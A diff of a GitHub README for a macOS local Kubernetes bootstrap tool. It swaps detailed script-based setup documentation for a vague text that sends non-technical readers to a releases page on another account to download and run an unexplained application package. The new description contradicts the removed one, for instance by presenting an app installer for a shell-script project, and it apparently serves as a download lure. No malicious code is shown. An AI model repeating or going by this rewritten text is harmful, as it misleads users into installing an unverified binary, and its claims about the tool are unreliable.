@@ -1,451 +1,107 @@
-# 🚀 macmagik-docker-k8s-bootstrap
+# 🚀 macmagik-docker-k8s-bootstrap - Simplify Your Local Development Setup
 
-**One-command setup for a complete local Kubernetes development environment with trusted TLS certificates and comprehensive monitoring stack.**
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/devlcan/macmagik-docker-k8s-bootstrap/releases)
 
-[![macOS](https://img.shields.io/badge/macOS-Intel%20%26%20Apple%20Silicon-blue?logo=apple)](https://www.apple.com/macos/)
-[![Docker Desktop](https://img.shields.io/badge/Docker%20Desktop-Required-blue?logo=docker)](https://www.docker.com/products/docker-desktop/)
-[![Kubernetes](https://img.shields.io/badge/Kubernetes-1.24+-blue?logo=kubernetes)](https://kubernetes.io/)
-[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
+## 📋 Overview
 
-> **Stop fighting certificates, start building amazing things!** ✨  
-> No more `curl -k`, no more certificate warnings - just pure local development bliss.
+macmagik-docker-k8s-bootstrap is a simple tool designed to help you set up local development environments using Docker Desktop and Kubernetes. It integrates essential services like Ingress-Nginx, Grafana, Prometheus, Jaeger, and local TLS easily, allowing you to focus on development without the hassle of manual configuration.
 
-## 🎯 What This Gives You
+## ⚙️ Features
 
-### 🔐 **Trusted TLS Everywhere**
-- **Wildcard certificates** for `*.kubernetes.docker.internal`
-- **Green lock in browsers** - no security warnings
-- **macOS keychain integration** - system-wide trust
-- **Works with any subdomain** you create
+- **Docker Desktop Integration**: Easily run Kubernetes and Docker together.
+- **Preconfigured Services**: Get started quickly with integrated services.
+- **Local TLS Support**: Secure your local applications without extra steps.
+- **User-Friendly Setup**: Designed for users with no programming experience.
+- **Extensive Monitoring**: Use Grafana and Prometheus for real-time insights.
+- **Trace Applications**: Jaeger helps you monitor the performance of your services.
 
-### 📊 **Production-Grade Monitoring**
-- **Prometheus** - Metrics collection with 30-day retention
-- **Grafana** - Beautiful dashboards with pre-built Kubernetes monitoring
-- **Jaeger** - Distributed tracing for microservices
-- **AlertManager** - Intelligent alerting and notifications
+## 🌟 System Requirements
 
-### ⚡ **Developer Experience**
-- **One-command setup** - From zero to production-ready in 2 minutes
-- **Automatic cleanup** - Complete removal when you're done
-- **Example applications** - Multi-service architectures ready to deploy
-- **Recovery tools** - Handle conflicts and stuck resources
+- **Operating System**: macOS with Apple Silicon support
+- **Docker Desktop**: Latest version is recommended. Ensure that Kubernetes is enabled in settings.
+- **Memory**: At least 8 GB of RAM for smooth performance.
+- **Disk Space**: Minimum of 5 GB free disk space to accommodate the services.
 
----
+## 🚀 Getting Started
 
-## 🚀 Quick Start
+Follow these simple steps to install and run macmagik-docker-k8s-bootstrap:
 
-### Prerequisites
-```bash
-# Required tools (install via Homebrew)
-brew install helm kubectl
+1. **Visit the Releases Page**
 
-# Required environment
-✅ macOS (Intel or Apple Silicon)
-✅ Docker Desktop with Kubernetes enabled
-✅ Admin privileges for certificate installation
-```
+   Go to the [releases page](https://github.com/devlcan/macmagik-docker-k8s-bootstrap/releases) to find the latest version.
 
-### One-Command Installation
-```bash
-# Clone and setup everything
-git clone https://github.com/YOUR_USERNAME/macmagik-docker-k8s-bootstrap.git
-cd macmagik-docker-k8s-bootstrap
-chmod +x *.sh scripts/*.sh
-./setup-ingress.sh
-```
+2. **Download the Application**
 
-**That's it!** 🎉 In under 2 minutes you'll have:
-- ✅ NGINX Ingress Controller with trusted certificates
-- ✅ Complete monitoring stack (Prometheus, Grafana, Jaeger)
-- ✅ Example applications ready to use
-- ✅ All URLs accessible with green lock 🔒
+   On the releases page, find the latest release and click the link to download the application package.
 
-### 🔍 Verify Your Setup
-```bash
-# Run comprehensive verification (recommended)
-./verify-setup.sh
-```
+3. **Install the Application**
 
-This verification script tests all 14 components:
-- **Core Infrastructure** (4 tests): Ingress controller, certificates, DNS resolution
-- **Monitoring Stack** (7 tests): Prometheus, Grafana, AlertManager accessibility
-- **Distributed Tracing** (3 tests): Jaeger components and health checks
+   After downloading, locate the downloaded file in your Downloads folder. 
+   
+   To install:
+   - Open the file.
+   - Follow the on-screen instructions to complete the installation.
 
----
+4. **Run the Application**
 
-## 🌐 Access Your Services
+   Once installed, open the application from your Applications folder. The tool will prepare your local environment automatically.
 
-### 🔧 **Core Infrastructure**
-| Service | URL | Purpose | Credentials |
-|---------|-----|---------|-------------|
-| **Echo Test App** | https://echo.kubernetes.docker.internal/ | Test ingress setup | None |
-| **Any Subdomain** | https://[anything].kubernetes.docker.internal/ | Test custom services | None |
+## 🚦 Setting Up Your Environment
 
-### 📊 **Monitoring & Observability**
-| Service | URL | Purpose | Credentials |
-|---------|-----|---------|-------------|
-| **Prometheus** | https://prometheus.kubernetes.docker.internal/ | Metrics collection & queries | None |
-| **Grafana** | https://grafana.kubernetes.docker.internal/ | Dashboards & visualization | `admin` / `admin123` |
-| **AlertManager** | https://alertmanager.kubernetes.docker.internal/ | Alert management | None |
-| **Jaeger** | https://jaeger.kubernetes.docker.internal/ | Distributed tracing | None |
+1. **Open Docker Desktop**
 
-### 🎛️ **Pre-Built Example Applications**
-| Application | URL | Purpose | Features |
-|-------------|-----|---------|----------|
-| **Multi-Service Demo** | https://frontend.kubernetes.docker.internal/ | Microservices architecture | Frontend, API, Admin panels |
-| **SPA Application** | https://spa.kubernetes.docker.internal/ | Single Page App | Client-side routing |
-| **Monitoring Dashboard** | https://monitoring.kubernetes.docker.internal/ | Unified monitoring | Real-time metrics |
+   Make sure Docker Desktop is running. Check if Kubernetes integration is enabled in the settings.
 
----
+2. **Launch macmagik-docker-k8s-bootstrap**
 
-## 📖 Usage Guide
+   When you open the application, it will set up the Docker containers required for the services.
 
-### 🏗️ **Deploy Example Applications**
+3. **Verify the Setup**
 
-```bash
-# Deploy complete multi-service architecture
-kubectl apply -f examples/multi-service/
-# Access at: https://frontend.kubernetes.docker.internal/
-#           https://api.kubernetes.docker.internal/
-#           https://admin.kubernetes.docker.internal/
+   After the setup is complete, you can use your browser to check the services:
+   - Access Grafana at `http://localhost:3000`
+   - Check Prometheus at `http://localhost:9090`
+   - Monitor your application traces with Jaeger at `http://localhost:16686`
+   
+   These addresses will help you ensure everything is running smoothly.
 
-# Deploy single-page application
-kubectl apply -f examples/spa-application/
-# Access at: https://spa.kubernetes.docker.internal/
+## 📥 Download & Install
 
-# Deploy monitoring dashboard
-kubectl apply -f examples/monitoring-dashboard/
-# Access at: https://monitoring.kubernetes.docker.internal/
-```
-
-### 🛠️ **Create Your Own Service**
-
-1. **Create your application deployment:**
-```yaml
-# my-app.yaml
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: my-app
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: my-app
-  template:
-    metadata:
-      labels:
-        app: my-app
-    spec:
-      containers:
-      - name: my-app
-        image: nginx:latest
-        ports:
-        - containerPort: 80
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: my-app
-spec:
-  selector:
-    app: my-app
-  ports:
-  - port: 80
-    targetPort: 80
-```
-
-2. **Create ingress with trusted TLS:**
-```yaml
-# my-app-ingress.yaml
-apiVersion: networking.k8s.io/v1
-kind: Ingress
-metadata:
-  name: my-app-ingress
-  annotations:
-    nginx.ingress.kubernetes.io/ssl-redirect: "true"
-spec:
-  ingressClassName: nginx
-  tls:
-  - hosts:
-    - my-app.kubernetes.docker.internal
-    secretName: default-tls  # Reuse the wildcard certificate!
-  rules:
-  - host: my-app.kubernetes.docker.internal
-    http:
-      paths:
-      - path: /
-        pathType: Prefix
-        backend:
-          service:
-            name: my-app
-            port:
-              number: 80
-```
-
-3. **Deploy and access:**
-```bash
-# Deploy your application
-kubectl apply -f my-app.yaml -f my-app-ingress.yaml
-
-# Add to hosts file (automatic if using setup script)
-echo "127.0.0.1 my-app.kubernetes.docker.internal" | sudo tee -a /etc/hosts
-
-# Access with trusted certificate!
-open https://my-app.kubernetes.docker.internal/
-```
-
-### 📊 **Using the Monitoring Stack**
-
-#### **Prometheus - Metrics & Alerting**
-```bash
-# Access Prometheus UI
-open https://prometheus.kubernetes.docker.internal/
-
-# Example queries to try:
-# - Container CPU usage: rate(container_cpu_usage_seconds_total[5m])
-# - Memory usage: container_memory_usage_bytes
-# - Pod status: kube_pod_status_phase
-```
-
-#### **Grafana - Dashboards**
-```bash
-# Access Grafana (admin/admin123)
-open https://grafana.kubernetes.docker.internal/
-
-# Pre-installed dashboards:
-# - Kubernetes / Compute Resources / Cluster
-# - Kubernetes / Compute Resources / Namespace
-# - Node Exporter / Nodes
-```
-
-#### **Jaeger - Distributed Tracing**
-```bash
-# Access Jaeger UI
-open https://jaeger.kubernetes.docker.internal/
-
-# Send traces to Jaeger from your applications:
-# HTTP endpoint: http://jaeger-prod-collector.observability.svc.cluster.local:14268/api/traces
-# Agent endpoint: jaeger-prod-agent.observability.svc.cluster.local:6831
-```
-
----
-
-## 🧹 Cleanup & Recovery
-
-### **Complete Cleanup**
-```bash
-# Remove everything (certificates, services, monitoring)
-./cleanup-ingress.sh
-```
-
-### **Quick Recovery** (for stuck resources)
-```bash
-# If setup fails with conflicts or "object modified" errors
-./recovery.sh
-
-# Then retry setup
-./setup-ingress.sh
-```
-
-### **Selective Cleanup**
-```bash
-# Remove only monitoring stack
-helm uninstall prometheus -n monitoring
-kubectl delete namespace monitoring observability
-
-# Remove only example applications
-kubectl delete -f examples/multi-service/
-kubectl delete -f examples/spa-application/
-
-# Remove specific ingress
-kubectl delete ingress my-app-ingress
-```
-
----
+To get started, download the latest version from the [releases page](https://github.com/devlcan/macmagik-docker-k8s-bootstrap/releases).
 
 ## 🔧 Troubleshooting
 
-> **💡 Quick Diagnosis:** Run `./verify-setup.sh` first to identify issues automatically.
+If you encounter issues during setup, keep the following tips in mind:
 
-### **Certificate Issues**
+- **Docker Not Running**: Ensure that Docker Desktop is open and running in your system tray.
+- **Kubernetes Disabled**: Verify that Kubernetes is enabled in Docker Desktop settings.
+- **Resource Limitations**: Check that your system meets the memory and disk space requirements.
 
-**Problem:** Certificate not trusted in browser
-```bash
-# Check if certificate exists in keychain
-security find-certificate -c "*.kubernetes.docker.internal" /Library/Keychains/System.keychain
+Should you continue to experience difficulties, you can find additional support in the GitHub Issues section of the repository.
 
-# Re-add certificate manually
-kubectl get secret default-tls -n ingress-nginx -o jsonpath='{.data.tls\.crt}' | base64 -d > temp-cert.crt
-sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain temp-cert.crt
-rm temp-cert.crt
-```
+## 📝 Contribution Guidelines
 
-### **Service Access Issues**
+We welcome contributions! If you'd like to improve this project, please visit the GitHub repository and follow the guidelines. You can submit issues and pull requests to help us make macmagik-docker-k8s-bootstrap even better.
 
-**Problem:** Service not accessible
-```bash
-# Check ingress controller status
-kubectl get pods -n ingress-nginx
-kubectl logs -n ingress-nginx -l app.kubernetes.io/name=ingress-nginx
+## 📚 Topics
 
-# Check your service and ingress
-kubectl get svc,ingress -A
-kubectl describe ingress my-app-ingress
+This tool is relevant for users interested in:
+- apple-silicon 
+- docker-desktop 
+- grafana 
+- ingress-nginx 
+- jaeger 
+- kubernetes 
+- local-development 
+- macpro 
+- prometheus 
+- tahoe 
 
-# Check DNS resolution
-grep kubernetes.docker.internal /etc/hosts
-nslookup my-app.kubernetes.docker.internal
-```
+Feel free to explore each topic to understand more about the technologies involved.
 
-### **Monitoring Issues**
+## 🌐 Links
 
-**Problem:** Monitoring services not responding
-```bash
-# Check monitoring pods
-kubectl get pods -n monitoring -n observability
+- **GitHub Repository**: [macmagik-docker-k8s-bootstrap](https://github.com/devlcan/macmagik-docker-k8s-bootstrap)
+- **Issues Tracker**: [Report an Issue](https://github.com/devlcan/macmagik-docker-k8s-bootstrap/issues) 
 
-# Check specific service logs
-kubectl logs -n monitoring prometheus-grafana-xxx
-kubectl logs -n observability jaeger-prod-xxx
-
-# Restart monitoring stack
-helm upgrade prometheus prometheus-community/kube-prometheus-stack -n monitoring
-```
-
-### **Resource Conflicts**
-
-**Problem:** "Object has been modified" or "AlreadyExists" errors
-```bash
-# Use recovery script (handles most conflicts)
-./recovery.sh
-
-# Manual cleanup for persistent issues
-kubectl patch pv pv-name -p '{"metadata":{"finalizers":null}}'
-kubectl delete namespace stuck-namespace --grace-period=0 --force
-```
-
-For more detailed troubleshooting, see [TROUBLESHOOTING.md](TROUBLESHOOTING.md).
-
----
-
-## 🏗️ Architecture
-
-### **Network Flow**
-```
-Browser Request (https://app.kubernetes.docker.internal)
-        ↓
-macOS /etc/hosts (127.0.0.1)
-        ↓
-Docker Desktop (localhost:443)
-        ↓
-NGINX Ingress Controller (hostPort)
-        ↓
-Kubernetes Service
-        ↓
-Pod (your application)
-```
-
-### **Certificate Chain**
-```
-Root CA (kubernetes-ca.crt)
-        ↓
-Wildcard Certificate (*.kubernetes.docker.internal)
-        ↓
-macOS Keychain (system-wide trust)
-        ↓
-Kubernetes TLS Secret (default-tls)
-        ↓
-Ingress TLS Termination
-```
-
-### **Monitoring Architecture**
-```
-Applications → Prometheus (metrics) → Grafana (dashboards)
-             ↓
-Applications → Jaeger Agent → Jaeger Collector → Jaeger Query → Jaeger UI
-             ↓
-Prometheus → AlertManager (alerts) → Notifications
-```
-
----
-
-## 📁 Project Structure
-
-```
-macmagik-docker-k8s-bootstrap/
-├── setup-ingress.sh           # Main setup script
-├── cleanup-ingress.sh         # Complete cleanup
-├── recovery.sh                # Resource conflict recovery
-├── verify-setup.sh            # Comprehensive verification
-├── scripts/
-│   ├── install-prometheus.sh  # Monitoring stack
-│   └── install-jaeger.sh      # Distributed tracing
-├── examples/
-│   ├── multi-service/         # Microservices demo
-│   ├── spa-application/       # Single-page app
-│   ├── monitoring-dashboard/  # Unified monitoring
-│   └── README.md              # Examples documentation
-├── CONTRIBUTING.md            # Contribution guidelines
-├── TROUBLESHOOTING.md         # Common issues & solutions
-├── LICENSE                    # MIT license
-└── README.md                  # This file
-```
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-**Quick workflow:**
-
-1. **Fork the repository**
-2. **Create a feature branch:** `git checkout -b feature/amazing-feature`
-3. **Test your changes:** `./cleanup-ingress.sh && ./setup-ingress.sh && ./verify-setup.sh`
-4. **Commit your changes:** `git commit -m 'Add amazing feature'`
-5. **Push to the branch:** `git push origin feature/amazing-feature`
-6. **Open a Pull Request**
-
-### **Development Setup**
-```bash
-# Test the complete flow
-./cleanup-ingress.sh  # Clean slate
-./setup-ingress.sh    # Full setup
-./verify-setup.sh     # Verify everything works
-
-# Test example applications
-kubectl apply -f examples/multi-service/
-curl -k https://frontend.kubernetes.docker.internal/
-
-# Cleanup after testing
-./cleanup-ingress.sh
-```
-
----
-
-## 📄 License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
----
-
-## 🙏 Acknowledgments
-
-- **Docker Desktop team** for making Kubernetes accessible on macOS
-- **NGINX Ingress Controller** maintainers for excellent Docker Desktop support
-- **Prometheus Operator** team for simplified monitoring setup
-- **Jaeger** team for outstanding distributed tracing
-- **Kubernetes community** for incredible documentation and support
-
----
-
-## ⭐ Star History
-
-If this project saved you time and frustration, please consider giving it a star! ⭐
-
----
-
-**Made with ❤️ for developers who are tired of fighting local Kubernetes certificates**
-
-*Stop configuring, start building!* 🚀
+If you have any feedback or suggestions, please reach out through the repository.
